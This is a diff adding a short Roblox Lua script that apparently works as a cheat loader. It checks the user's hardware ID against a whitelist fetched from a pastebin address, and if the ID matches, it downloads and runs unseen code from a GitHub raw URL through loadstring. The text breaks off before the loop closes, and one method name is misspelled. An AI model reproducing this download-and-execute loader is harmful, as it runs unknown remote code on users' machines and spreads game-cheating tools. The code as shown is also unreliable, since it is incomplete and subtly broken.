@@ -1,0 +1,8 @@
+local HWIDTable = loadstring(game:HttpGet("https://pastebin.com/raw/zqjewQQy"))()
+local HWID = game:GetService("RbxAnalyticsService"):GetClinetId()
+
+for i,v in pairs(HWIDTable) do
+    if v == HWID then
+        print("Hardware ID Passed, Whitelist By Noah#4750")
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Slay12321/s/main/slay'),true))()
+    end
